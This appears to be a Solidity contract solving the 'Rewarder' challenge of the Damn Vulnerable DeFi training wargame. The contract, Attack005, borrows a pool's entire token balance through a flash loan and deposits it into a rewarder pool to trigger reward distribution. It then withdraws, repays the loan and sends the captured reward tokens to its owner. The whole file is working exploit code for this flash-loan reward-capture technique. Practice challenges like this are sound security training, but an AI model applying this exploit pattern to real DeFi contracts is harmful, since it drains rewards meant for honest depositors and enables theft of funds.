// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

/**
 * @title Attack for DeFi
 * @author CP3cO / Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function rewardToken() external returns (address);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);

    function isNewRewardsRound() external view returns (bool);
}

contract Attack005 {
    using Address for address;
    address immutable pool;
    address immutable owner;
    address immutable flashloanPool;
    address immutable token;

    constructor(
        address _owner,
        address _targetPool,
        address _flashLoanPool,
        address _token
    ) {
        pool = _targetPool;
        owner = _owner;
        flashloanPool = _flashLoanPool;
        token = _token;
    }

    function attack() external payable {
        uint256 amount = IERC20(token).balanceOf(address(flashloanPool));
        IFlashLoanerPool(flashloanPool).flashLoan(amount);
    }

    function emptyMe() public {
        address rewardT = IRewarderPool(pool).rewardToken();
        uint256 balance = IERC20(rewardT).balanceOf(address(this));
        if (balance > 0) {
            IERC20(rewardT).transfer(owner, balance);
        }
    }

    function receiveFlashLoan(uint256 _amount) external payable {
        IERC20(token).approve(pool, type(uint256).max);
        IRewarderPool(pool).deposit(_amount);
        IRewarderPool(pool).distributeRewards();
        IRewarderPool(pool).withdraw(_amount);
        IERC20(token).transfer(msg.sender, _amount);
        emptyMe();
    }
}
